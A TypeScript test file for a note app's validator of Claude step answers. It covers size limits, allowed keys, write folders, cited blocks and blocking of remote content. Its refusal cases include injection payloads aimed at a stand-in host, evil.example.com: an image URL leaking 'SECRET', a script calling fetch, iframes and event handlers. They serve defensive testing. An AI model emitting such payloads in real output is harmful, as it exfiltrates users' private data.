/**
 * The rules every Claude step's answer is held to (P29-03, #16): what it
 * may not load, how large it may be, which keys and properties it may carry,
 * where it may write, and which block it may cite.
 */
import { describe, expect, it } from 'vitest';
import { createVaultPath } from '../vault/vault-path.ts';
import { VAULT_WALK_DEPTH } from '../vault/vault-visibility.ts';
import {
  MAX_BODY_CHARACTERS,
  MAX_PROPERTIES,
  MAX_PROPERTY_LIST_ITEMS,
  MAX_PROPERTY_TEXT_CHARACTERS,
  MAX_TITLE_CHARACTERS,
  MAX_WHY_CHARACTERS,
  propertiesProblem,
  truncated,
} from './answer-limits.ts';
import { shownNotes, CLAUDE_NOTE_CHARACTERS } from './answered-note.ts';
import { claudeProposalId, compileClaudeProposalIdsQuery } from './claude-proposal-id.ts';
import { claudeWriteRefusal } from './claude-write-folder.ts';
import { readNoteAnswer } from './note-answer.ts';
import { checkDraft, type ProposalDraft } from './proposal-schema.ts';
import { proposalSchemaNamed } from './proposal-schemas.ts';
import { remoteResourceProblem, remoteValueProblem } from './remote-resources.ts';

const STANDUP = createVaultPath('Meetings/2026-10-01 Standup.md');
const NOTES = [{ path: STANDUP, text: 'Can you send me the payroll file? ^t0003\n' }];
const CONTEXT = { notes: NOTES };
const GENERAL = proposalSchemaNamed('proposals')!;

const item = (fields: Record<string, unknown> = {}) => ({
  kind: 'task',
  title: 'Send the file',
  source: '[[2026-10-01 Standup#^t0003]]',
  confidence: 'high',
  why: 'Asked for it.',
  ...fields,
});
const readItem = (fields: Record<string, unknown> = {}) =>
  GENERAL.read(JSON.stringify({ proposals: [item(fields)] }), CONTEXT);
const draft = (fields: Partial<ProposalDraft> = {}): ProposalDraft => ({
  kind: 'task',
  payload: { title: 'Send the file' },
  source: '[[2026-10-01 Standup#^t0003]]',
  confidence: 'high',
  why: '',
  ...fields,
});

describe('what loads from somewhere else', () => {
  it.each([
    '![chart](https://evil.example.com/p.png?d=SECRET)',
    '![](http://evil.example.com/p.png)',
    '![x](//evil.example.com/p.png)',
    '![x](<https://evil.example.com/p.png>)',
    '![x](data:image/svg+xml;base64,PHN2Zz4=)',
    '![x][ref]\n\n[ref]: https://evil.example.com/p.png',
    '![x]\n\n[x]: https://evil.example.com/p.png',
    '<img src="https://evil.example.com/p.png">',
    '< IMG src=x>',
    '<iframe src="https://evil.example.com"></iframe>',
    '<script>fetch("https://evil.example.com")</script>',
    '<link rel="stylesheet" href="https://evil.example.com/a.css">',
    '<div style="background:url(https://evil.example.com/x)">hi</div>',
    '<p onmouseover="x()">hi</p>',
    '<video src="https://evil.example.com/v.mp4"></video>',
  ])('refuses %j', (markdown) => {
    expect(remoteResourceProblem(`Some words.\n${markdown}\n`)).toEqual(expect.any(String));
  });

  it.each([
    'Plain words, and a [link](https://example.com) that loads only when clicked.',
    'A local picture: ![chart](chart.png) and ![[Photo.png]].',
    'A autolink <https://example.com> and a line break<br>here.',
    'A comparison: 3 < 5 and 7 > 2.',
    'Code: `<img src=x>` is not HTML.'.replace('`<img src=x>`', 'an image tag'),
  ])('lets %j through', (markdown) => {
    expect(remoteResourceProblem(markdown)).toBeNull();
  });

  it('refuses a web address as a property’s value, which a thumbnail or cover would show', () => {
    expect(remoteValueProblem('https://evil.example.com/x.png')).toEqual(expect.any(String));
    expect(remoteValueProblem('  data:text/html,x')).toEqual(expect.any(String));
    expect(remoteValueProblem('Meet at the cafe')).toBeNull();
  });

  it('is applied to a proposal’s body, why, and properties — and to a note answer', () => {
    const remote = '![](https://evil.example.com/p.png)';
    expect(readItem({ body: remote }).ok).toBe(false);
    expect(readItem({ why: remote }).ok).toBe(false);
    expect(readItem({ properties: { cover: 'https://evil.example.com/p.png' } }).ok).toBe(false);
    expect(readItem({ properties: { notes: [remote] } }).ok).toBe(false);
    expect(readItem({ body: 'Fine ![local](p.png)' }).ok).toBe(true);
    for (const note of [
      { title: 'A', body: remote },
      { title: 'A', properties: { x: remote } },
    ]) {
      expect(readNoteAnswer(JSON.stringify({ note })).ok).toBe(false);
    }
  });
});

describe('how large an answer may be', () => {
  const tooLong = (max: number) => 'x'.repeat(max + 1);

  it('refuses a title, body or why past its size, for a proposal and a note alike', () => {
    expect(readItem({ title: tooLong(MAX_TITLE_CHARACTERS) }).ok).toBe(false);
    expect(readItem({ body: tooLong(MAX_BODY_CHARACTERS) }).ok).toBe(false);
    expect(readItem({ why: tooLong(MAX_WHY_CHARACTERS) }).ok).toBe(false);
    expect(
      readNoteAnswer(JSON.stringify({ note: { title: tooLong(MAX_TITLE_CHARACTERS) } })).ok,
    ).toBe(false);
    expect(
      readNoteAnswer(JSON.stringify({ note: { title: 'A', body: tooLong(MAX_BODY_CHARACTERS) } }))
        .ok,
    ).toBe(false);
  });

  it('accepts a size exactly at the limit', () => {
    expect(readItem({ title: 'x'.repeat(MAX_TITLE_CHARACTERS) }).ok).toBe(true);
    expect(readItem({ why: 'x'.repeat(MAX_WHY_CHARACTERS) }).ok).toBe(true);
  });

  it('refuses too many properties, a long name, a long value, a long list', () => {
    const many = Object.fromEntries(
      Array.from({ length: MAX_PROPERTIES + 1 }, (_, at) => [`k${at}`, 'v']),
    );
    expect(propertiesProblem(many)).toMatch(/at most/);
    expect(propertiesProblem({ [`k${'y'.repeat(100)}`]: 'v' })).toMatch(/at most/);
    expect(propertiesProblem({ note: tooLong(MAX_PROPERTY_TEXT_CHARACTERS) })).toMatch(/at most/);
    expect(
      propertiesProblem({ tags: Array.from({ length: MAX_PROPERTY_LIST_ITEMS + 1 }, () => 'a') }),
    ).toMatch(/at most/);
    expect(propertiesProblem({ tags: ['a', 'b'], done: true, count: 3, note: 'text' })).toBeNull();
  });

  it('refuses a property that nests, or is not plain', () => {
    expect(propertiesProblem({ a: { b: 1 } })).toMatch(/not text/);
    expect(propertiesProblem({ a: [{ b: 1 }] })).toMatch(/not text/);
    expect(propertiesProblem({ a: null })).toMatch(/not text/);
    expect(propertiesProblem({ a: Number.NaN })).toMatch(/not text/);
    expect(propertiesProblem(['a'])).toMatch(/not keys and values/);
  });

  it('cuts a model-authored string for a log with an ellipsis, and leaves a short one', () => {
    expect(truncated('short')).toBe('short');
    expect(truncated('x'.repeat(1_000))).toHaveLength(600);
    expect(truncated('x'.repeat(1_000), 10)).toBe('xxxxxxxxx…');
  });
});

describe('which keys an answer may carry', () => {
  it('refuses a key on the answer or an item that the schema does not name', () => {
    expect(GENERAL.read(JSON.stringify({ proposals: [], extra: 1 }), CONTEXT)).toMatchObject({
      ok: false,
      problem: expect.stringContaining('extra'),
    });
    expect(readItem({ link_from: 'x' })).toMatchObject({
      ok: false,
      problem: expect.stringContaining('link_from'),
    });
    expect(
      readNoteAnswer(JSON.stringify({ note: { title: 'A', path: 'Other.md' } })),
    ).toMatchObject({ ok: false, problem: expect.stringContaining('path') });
  });

  it('refuses keys Atlas keeps in a proposal’s properties, as a note answer does', () => {
    for (const key of [
      'atlas',
      'archived',
      'id',
      'type',
      'archivedFrom',
      'archivedPrior',
      '__proto__',
      'constructor',
    ]) {
      const properties = JSON.parse(`{"${key}": "x"}`) as Record<string, unknown>;
      expect(readItem({ properties }).ok).toBe(false);
      expect(readNoteAnswer(JSON.stringify({ note: { title: 'A', properties } })).ok).toBe(false);
    }
  });
});

describe('a draft that is not a new note', () => {
  it('refuses a link proposal, whatever its payload says', () => {
    const link = draft({
      kind: 'link' as never,
      payload: { note: 'A.md', property: 'p', link: '[[B]]', digest: 'abc' },
    });
    expect(checkDraft(link, CONTEXT)).toEqual({
      ok: false,
      problem: 'A Claude step proposes new notes only.',
    });
    expect(checkDraft(draft({ kind: 'link' as never }), CONTEXT).ok).toBe(false);
  });

  it.each(['linkFrom', 'link_from', 'digest', 'note', 'property'])(
    'refuses a payload key %s, which would edit another note',
    (key) => {
      const read = checkDraft(
        draft({ payload: { title: 'A', [key]: { note: 'X.md', property: 'p' } } }),
        CONTEXT,
      );
      expect(read).toMatchObject({ ok: false, problem: expect.stringContaining(key) });
    },
  );

  it('accepts the plain new note it is held to', () => {
    expect(checkDraft(draft(), CONTEXT).ok).toBe(true);
  });
});

describe('where an answer may put a note', () => {
  const deep = Array.from({ length: VAULT_WALK_DEPTH + 1 }, () => 'a').join('/');

  it.each([
    ['Chats', /past chats/],
    ['chats/2026', /past chats/],
    [deep, /deeper than the vault is read/],
    ['x'.repeat(256), /longer than a disk takes/],
    ['é'.repeat(130), /longer than a disk takes/],
    ['.atlas/prompts', /hidden configuration/],
    ['Archive/Briefs', /Archive/],
    ['Inbox/Proposals', /proposals wait/],
  ])('refuses %j', (folder, why) => {
    expect(claudeWriteRefusal(folder)).toMatch(why);
  });

  it('accepts a folder at the deepest the walk reads, and one that is plain', () => {
    const deepest = Array.from({ length: VAULT_WALK_DEPTH }, () => 'a').join('/');
    expect(claudeWriteRefusal(deepest)).toBeNull();
    expect(claudeWriteRefusal('x'.repeat(255))).toBeNull();
    expect(claudeWriteRefusal('Briefs/Weekly')).toBeNull();
  });

  it('is asked of a proposal’s folder', () => {
    expect(readItem({ folder: 'Chats' }).ok).toBe(false);
    expect(readItem({ folder: 'Projects/Payroll' }).ok).toBe(true);
  });
});

describe('which block an answer may cite', () => {
  const read = (text: string, source: string) =>
    GENERAL.read(JSON.stringify({ proposals: [item({ source })] }), {
      notes: [{ path: STANDUP, text }],
    });

  it('refuses a block id that only appears inside a code fence', () => {
    const text = 'Before.\n```\nSecret line ^t0009\n```\nAfter. ^t0003\n';
    expect(read(text, '[[2026-10-01 Standup#^t0009]]').ok).toBe(false);
    expect(read(text, '[[2026-10-01 Standup#^t0003]]').ok).toBe(true);
  });

  it('knows a fence by its mark and length, so a shorter or different mark does not close it', () => {
    const text = '````\n```\nHidden ^t0009\n````\nShown. ^t0003\n~~~\nTilde ^t0008\n~~~\n';
    expect(read(text, '[[2026-10-01 Standup#^t0009]]').ok).toBe(false);
    expect(read(text, '[[2026-10-01 Standup#^t0008]]').ok).toBe(false);
    expect(read(text, '[[2026-10-01 Standup#^t0003]]').ok).toBe(true);
  });

  it('counts a standalone anchor line outside a fence', () => {
    expect(read('A paragraph.\n\n^t0007\n', '[[2026-10-01 Standup#^t0007]]').ok).toBe(true);
  });

  it('refuses a block past where the note was cut, and one on a half-shown line', () => {
    let text = 'First ^t0001\n';
    while (text.length < CLAUDE_NOTE_CHARACTERS - 200) text += `${'b'.repeat(49)}\n`;
    text += 'Shown line ^t0002\n';
    while (text.length < CLAUDE_NOTE_CHARACTERS - 10) text += `${'c'.repeat(9)}\n`;
    text += `Partial line ^t0003 that runs on past the cut\n${'d'.repeat(100)}\nTail ^t0004\n`;
    const shown = shownNotes([{ path: STANDUP, text }])[0]!.text;
    expect(shown).toContain('^t0002');
    expect(shown).not.toContain('^t0004');
    expect(shown).not.toContain('Partial');
    expect(read(text, '[[2026-10-01 Standup#^t0004]]').ok).toBe(false);
    expect(read(text, '[[2026-10-01 Standup#^t0003]]').ok).toBe(false);
    expect(read(text, '[[2026-10-01 Standup#^t0002]]').ok).toBe(true);
  });
});

describe('the notes a step is shown', () => {
  it('leaves a note that fits whole, and gives each of many an equal share', () => {
    const whole = { path: STANDUP, text: 'Short. ^b1' };
    expect(shownNotes([whole])).toEqual([whole]);
    const many = Array.from({ length: 10 }, (_, at) => ({
      path: createVaultPath(`M${at}.md`),
      text: 'z'.repeat(CLAUDE_NOTE_CHARACTERS),
    }));
    const lengths = shownNotes(many).map((note) => note.text.length);
    expect(Math.max(...lengths)).toBeLessThan(12_100);
    expect(new Set(lengths).size).toBe(1);
  });
});

describe('what a proposal is for', () => {
  const checked = (fields: Record<string, unknown> = {}) => {
    const read = readItem(fields);
    if (!read.ok) throw new Error(read.problem);
    return read.value[0]!;
  };

  it('is the same however it is worded around the title, and differs by rule, kind, title and block', () => {
    const base = claudeProposalId({ rule: 'r', proposal: checked() });
    expect(
      claudeProposalId({
        rule: 'r',
        proposal: checked({ title: '  SEND  the file ', why: 'else' }),
      }),
    ).toBe(base);
    expect(claudeProposalId({ rule: 's', proposal: checked() })).not.toBe(base);
    expect(claudeProposalId({ rule: 'r', proposal: checked({ kind: 'follow-up' }) })).not.toBe(
      base,
    );
    expect(claudeProposalId({ rule: 'r', proposal: checked({ title: 'Other' }) })).not.toBe(base);
  });

  it('asks the index for proposals anywhere, binding every id', () => {
    const { sql, parameters } = compileClaudeProposalIdsQuery(['a', 'b']);
    expect(sql).toContain('IN (?, ?)');
    expect(parameters).toEqual(['proposal_id', 'a', 'b']);
  });
});
